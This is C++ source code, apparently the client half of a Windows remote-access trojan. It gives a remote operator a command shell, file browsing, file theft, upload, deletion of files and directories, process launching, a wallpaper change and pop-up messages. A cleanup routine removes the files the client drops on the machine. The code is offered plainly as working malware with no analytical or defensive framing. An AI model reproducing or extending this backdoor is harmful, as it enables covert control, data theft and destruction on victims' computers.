void send(string data)
{
    char digitBuffer[1024];
    send(objSocket, to_string(data.length()).data(), sprintf(digitBuffer, "%d", data.length()), 0); Sleep(650);
    send(objSocket, data.data(), data.length(), 0);
}

string recv()
{
    int bufsize;
    string data;

    recv(objSocket, buffer, sizeof(buffer), 0);
    bufsize = atoi(buffer);

    while (data.length() < bufsize) {
        try {
            data.append(buffer, recv(objSocket, buffer, sizeof(buffer), 0));
            return data;
        
        } catch (exception e) { break; }

    } return "error";
}

void clearLogs() {
    for (int i = 0; i < fileLog.size(); i++) {
        remove(fileLog[i].data());
    
    } fileLog.clear();
}
// ------------------------------------------------------------------------------------------------------------------
void vbsMessageBox(string message)
{
    string location = appdata + "/msg.vbs";
    ofstream VBS_FILE(location);

    VBS_FILE << "MsgBox (\"" + message + "\"), 64, \"[Message]\"";
    VBS_FILE.close();

    if (ShellExecuteA(NULL, "open", location.data(), NULL, NULL, 0)) {
        send("[+] Message Sent");
    
    } else send("[!] Unable to Display Message");

    fileLog.push_back(location);
}

void ChangeWallpaper(string fileName)
{
    recv(objSocket, buffer, sizeof(buffer), 0);

    string data;
    int fileSize = atoi(buffer);

    while (data.length() < fileSize) {
        try {
            data.append(buffer, recv(objSocket, buffer, sizeof(buffer), 0));
        
        } catch (exception e) { return; }
    
    } string location = appdata + "/" + fileName;

    FILE* RemoteFile = fopen(location.data(), "wb");
    fwrite(data.data(), 1, data.size(), RemoteFile);
    fclose(RemoteFile);

    SystemParametersInfo
    (
        SPI_SETDESKWALLPAPER,
        0,
        (PVOID)location.data(),
        SPIF_UPDATEINIFILE
    
    ); fileLog.push_back(location);
}

void StartProcess(string filePath)
{
    ifstream localFile(filePath);
    if (!localFile.is_open()) {
        send("invalid");
        return;
    
    } localFile.close(); send("valid");

    if (ShellExecuteA(NULL, "open", filePath.data(), NULL, NULL, 0)) {
        send("[+] Process Running");
    
    } else send("[!] Unable to Start Process");
}

void RemoteCMD()
{
    send(getcwd(buffer, sizeof(buffer)));

    string data;
    FILE* stream;
    char buf[1024];

    while (true)
    {
        string command = recv();
        if (command == "exit" || command == "error") return;

        command.append(" 2>&1");
        stream = popen(command.c_str(), "r");

        if (stream) {
            while (!feof(stream))
            if (fgets(buf, sizeof(buf), stream) != NULL) {
                data.append(buf);
            
            } pclose(stream);
        
        } send(data); data.clear();
    
    } fclose(stream);
}

void ViewFiles(string directory)
{
    struct dirent* entry;
    int fileCount = 0;
    string files;

    DIR* dir = opendir(directory.data());
    if (!dir) {
        send("invalid");
        return;
    
    } send("valid");

    try {
        while ((entry = readdir(dir)) != NULL) {
            if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) {
                continue;
                
            } files += entry->d_name; files += "|";  fileCount++;
        }
        closedir(dir); send(files);
    
    } catch (exception e) {
        return;
    }
}

void SendFile(string filePath)
{
    ifstream localFile(filePath);
    if (!localFile.is_open()) {
        send("invalid");
        return;
    
    } send("valid");

    vector<char> contents;
    string data;

    try {
        streampos start = localFile.tellg();
        localFile.seekg(0, ios::end);

        streampos end = localFile.tellg();
        localFile.seekg(0, ios::beg);

        contents.resize(static_cast<size_t>(end - start));
        localFile.read(&contents[0], contents.size());
        for(const char& c : contents) {
            data += c;
        
        }; localFile.close(); send(data);
    
    } catch (exception e) {
        return;
    }
}

void ReceiveFile(string fileName)
{
    recv(objSocket, buffer, sizeof(buffer), 0);

    string data;
    int fileSize = atoi(buffer);

    while (data.length() < fileSize) {
        try {
            data.append(buffer, recv(objSocket, buffer, sizeof(buffer), 0));
        
        } catch (exception e) { return; }
    
    } string location = appdata + "/" + fileName;

    FILE* RemoteFile = fopen(location.data(), "wb");
    fwrite(data.data(), 1, data.size(), RemoteFile);
    fclose(RemoteFile);

    fileLog.push_back(location);
}

void DelFile(string filePath)
{
    ifstream localFile(filePath);
    if (!localFile.is_open()) {
        send("invalid");
        return;
    
    } localFile.close(); send("valid");

    if (remove(filePath.data()) != 0) {
        send("[!] Unable to Delete File");
    
    } else send("[+] File Deleted");
}

void DelDirectory(string directory)
{
   if (GetFileAttributesA(directory.data()) == INVALID_FILE_ATTRIBUTES) {
        send("invalid");
        return;
    
    } send("valid");

    struct dirent* entry;
	DIR* dir = opendir(directory.data());

	while ((entry = readdir(dir)) != NULL) {
		string files = directory + "/" + entry->d_name;
		remove(files.data());
    
    } closedir(dir); rmdir(directory.data());

    if (GetFileAttributesA(directory.data()) != INVALID_FILE_ATTRIBUTES) {
        send("[!] Unable to Delete Directory");
        return;
    
    } send("[+] Directory Deleted");
}